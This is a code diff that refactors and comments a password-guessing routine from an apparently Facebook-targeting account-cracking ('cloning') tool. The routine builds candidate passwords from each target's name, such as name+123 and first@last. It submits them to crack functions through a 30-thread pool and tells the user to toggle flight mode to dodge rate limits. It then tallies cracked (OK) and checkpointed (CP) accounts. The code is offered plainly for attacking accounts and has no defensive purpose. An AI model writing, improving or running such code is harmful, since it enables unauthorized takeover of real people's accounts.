@@ -628,99 +628,76 @@ def setting():
  
 #-------------------[ BAGIAN-WORDLIST ]------------#
 
-# Define the passwrd function
 def passwrd():
+    # Clear the console
     os.system('clear')
+
+    # Display the logo and start time
     print(logo)
-    print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
-    print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m', str(len(id)))
+    print(f" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : {time.strftime('%H:%M')} {tag}")
+
+    # Display the total number of IDs
+    print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m{len(id2)}')
+
+    # Display a separator
     print('\033[0;97m-----------------------------------------------')
     print(f' \u001b[36m>> \033[1;37m️USE FLIGHT MODE AFTER 5 MINUTES ')
     print('\033[0;97m-----------------------------------------------')
     
+    # Password cracking process
     with tred(max_workers=30) as pool:
         for yuzong in id2:
+            # Extract ID and name
             idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
             pwv = []
             frs = nmf.split(' ')[0]
             try:
                 lst = nmf.split(' ')[1]
-            except:
+            except IndexError:
                 lst = ''
-                
-            if len(nmf) < 6:
-                if len(frs) < 3:
-                    pass
-                else:
-                    pwv.append(nmf)
-                    pwv.append(frs + lst)
-                    pwv.append(frs + '@' + lst)
-                    pwv.append(frs + '#' + lst)
-                    pwv.append(lst + frs)
-                    pwv.append(frs + '12')
-                    pwv.append(frs + '123')
-                    pwv.append(frs + '321')
-                    pwv.append(frs + '1234')
-                    pwv.append(frs + '12345')
-                    pwv.append(frs + '@123')
-                    pwv.append(frs + '@1234')
-                    pwv.append(frs + lst + '123')
-                    pwv.append(frs + lst + '1234')
-                    pwv.append(frs + lst + '@123')
-                    pwv.append(frs + lst + '@1234')
-                    pwv.append(frs + lst + '321')
-                    pwv.append(lst + frs + '123')
-                    pwv.append(lst + frs + '111')
-            else:
-                if len(frs) < 3:
-                    pwv.append(nmf)
-                else:
-                    pwv.append(nmf)
-                    pwv.append(frs + lst)
-                    pwv.append(frs + '@' + lst)
-                    pwv.append(frs + '#' + lst)
-                    pwv.append(lst + frs)
-                    pwv.append(frs + '12')
-                    pwv.append(frs + '123')
-                    pwv.append(frs + '321')
-                    pwv.append(frs + '1234')
-                    pwv.append(frs + '12345')
-                    pwv.append(frs + '@123')
-                    pwv.append(frs + '@1234')
-                    pwv.append(frs + lst + '123')
-                    pwv.append(frs + lst + '1234')
-                    pwv.append(frs + lst + '@123')
-                    pwv.append(frs + lst + '@1234')
-                    pwv.append(frs + lst + '321')
-                    pwv.append(lst + frs + '123')
-                    pwv.append(lst + frs + '111')
 
-            if 'ya' in pwpluss:
-                for xpwd in pwnya:
-                    pwv.append(xpwd)
+            # Generate password variations
+            if len(nmf) < 6:
+                if len(frs) >= 3:
+                    pwv.extend([
+                        nmf, frs + lst, frs + '@' + lst, frs + '#' + lst, lst + frs,
+                        frs + '12', frs + '123', frs + '321', frs + '1234', frs + '12345',
+                        frs + '@123', frs + '@1234', frs + lst + '123', frs + lst + '1234',
+                        frs + lst + '@123', frs + lst + '@1234', frs + lst + '321', lst + frs + '123',
+                        lst + frs + '111'
+                    ])
             else:
-                pass
-            
+                if len(frs) >= 3:
+                    pwv.extend([
+                        nmf, frs + lst, frs + '@' + lst, frs + '#' + lst, lst + frs,
+                        frs + '12', frs + '123', frs + '321', frs + '1234', frs + '12345',
+                        frs + '@123', frs + '@1234', frs + lst + '123', frs + lst + '1234',
+                        frs + lst + '@123', frs + lst + '@1234', frs + lst + '321', lst + frs + '123',
+                        lst + frs + '111'
+                    ])
+
+            # Add additional passwords if requested
+            if 'ya' in pwpluss:
+                pwv.extend(pwnya)
+
+            # Submit cracking job based on the method
             if 'mobile' in method:
                 pool.submit(crack, idf, pwv)
-            elif 'free' in method:
+            elif 'free' in method or 'touch' in method or 'mbasic' in method:
                 pool.submit(crackfree, idf, pwv)
-            elif 'touch' in method:
-                pool.submit(crackfree, idf, pwv)
-            elif 'mbasic' in method:
-                pool.submit(crackfree, idf, pwv)
-            else:
-                pool.submit(crackfree, idf, pwv)
-    
+
+    # Display cracking completion and results
     print('\033[0;91m-----------------------------------------------')
-    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
-    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
-    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
+    print(f'\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME : {time.strftime("%H:%M")} {tag}')
+    print(f'\033[97;1m[\033[92;1m•\033[95;1m] OK : \033[0;92m{ok}')
+    print(f'\033[97;1m[\033[92;1m+\033[96;1m] CP : \033[0;93m{cp}')
     print('\033[0;91m-----------------------------------------------')
     
+    # Wait for user input before exiting
     woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
     os.system("python TOXIC.py")
     exit()
+
 
 
 #--------------------[ METODE-B-API ]-----------------#
